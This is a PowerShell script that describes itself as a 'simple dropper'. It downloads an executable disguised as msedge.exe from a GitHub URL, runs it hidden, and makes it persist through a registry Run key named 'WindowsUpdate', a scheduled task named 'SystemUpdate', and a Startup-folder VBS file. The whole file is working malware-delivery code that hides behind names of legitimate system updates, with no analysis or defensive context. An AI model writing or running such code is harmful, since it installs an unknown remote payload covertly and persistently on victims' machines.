# Absolute simplest approach possible
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$tempPath = "$env:TEMP\data.exe"
$logPath = "$env:TEMP\debug.log"

# Simple logging
"$(Get-Date) - Starting simple dropper" | Out-File $logPath

try {
    # Download directly to temp
    "$(Get-Date) - Downloading to $tempPath" | Out-File $logPath -Append
    (New-Object Net.WebClient).DownloadFile($downloadUrl, $tempPath)
    
    # Verify download
    if (Test-Path $tempPath) {
        $fileSize = (Get-Item $tempPath).Length
        "$(Get-Date) - Download successful: $fileSize bytes" | Out-File $logPath -Append
        
        # Add to startup directly in registry
        "$(Get-Date) - Adding to startup" | Out-File $logPath -Append
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "`"$tempPath`"" -Force
        
        # Immediate run attempt
        "$(Get-Date) - Attempting to run" | Out-File $logPath -Append
        Start-Process $tempPath -ArgumentList "/silent" -WindowStyle Hidden
        
        # Create a scheduled task that runs 1 minute in the future
        "$(Get-Date) - Creating scheduled task" | Out-File $logPath -Append
        $action = New-ScheduledTaskAction -Execute $tempPath -Argument "/silent"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
        Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -Force
    } else {
        "$(Get-Date) - Download appeared to work but file not found" | Out-File $logPath -Append
    }
} catch {
    "$(Get-Date) - Error: $_" | Out-File $logPath -Append
}

# Create startup VBS as alternative method
try {
    "$(Get-Date) - Creating VBS startup script" | Out-File $logPath -Append
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $vbsPath = "$startupFolder\update.vbs"
    
    # VBS content
    $vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "$tempPath /silent", 0, False
"@
    
    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
    "$(Get-Date) - VBS created at $vbsPath" | Out-File $logPath -Append
} catch {
    "$(Get-Date) - VBS error: $_" | Out-File $logPath -Append
}

"$(Get-Date) - Script completed" | Out-File $logPath -Append